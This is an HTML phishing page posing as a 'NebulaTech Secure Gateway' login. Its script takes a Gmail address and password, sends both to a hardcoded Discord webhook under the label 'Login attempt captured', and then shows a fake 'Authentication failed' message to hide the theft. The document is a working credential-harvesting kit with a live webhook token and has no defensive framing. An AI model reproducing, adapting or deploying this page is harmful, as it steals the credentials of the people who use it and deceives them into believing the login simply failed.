<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>NebulaTech Secure Gateway</title>
  <style>
    body {
      background-color: #0d0d0d;
      color: #eaeaea;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .login-box {
      background-color: #1a1a1a;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 0 25px rgba(0,255,255,0.1);
      width: 380px;
    }

    h2 {
      text-align: center;
      color: #00ffff;
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      background-color: #2a2a2a;
      border: none;
      border-radius: 6px;
      color: #fff;
    }

    input::placeholder {
      color: #888;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #00cccc;
      border: none;
      border-radius: 6px;
      color: #000;
      font-weight: bold;
      margin-top: 15px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #00aaaa;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>NebulaTech Login</h2>
    <input type="text" id="email" placeholder="Email (required)">
    <input type="password" id="password" placeholder="Access Key">
    <button onclick="submitForm()">Access System</button>
  </div>

  <script>
    function isValidGmail(email) {
      return /^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(email);
    }

    async function submitForm() {
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value;

      if (!isValidGmail(email)) {
        alert("Invalid email. Must be a valid Gmail address.");
        return;
      }

      const payload = {
        content: "**Login attempt captured**",
        embeds: [{
          title: "ðŸ“¥ NebulaTech Credentials",
          color: 3447003,
          fields: [
            { name: "Email", value: email, inline: false },
            { name: "Access Key", value: password, inline: false },
            { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
          ]
        }]
      };

      // Replace with your actual webhook URL
      const webhookURL = "https://discord.com/api/webhooks/1396126913038123068/WuVgy5nWwXQRum5a1Ye0s2zQElODsb6XpTIeKgbINlc51ZnfD-8kCUTg7a3WBBMrj56e";

      try {
        await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch (e) {
        // Optional: log to console if webhook fails
        console.warn("Webhook failed", e);
      }

      // Simulate failed login
      setTimeout(() => {
        alert("Authentication failed. Please try again.");
        location.reload();
      }, 800);
    }
  </script>
</body>
</html>
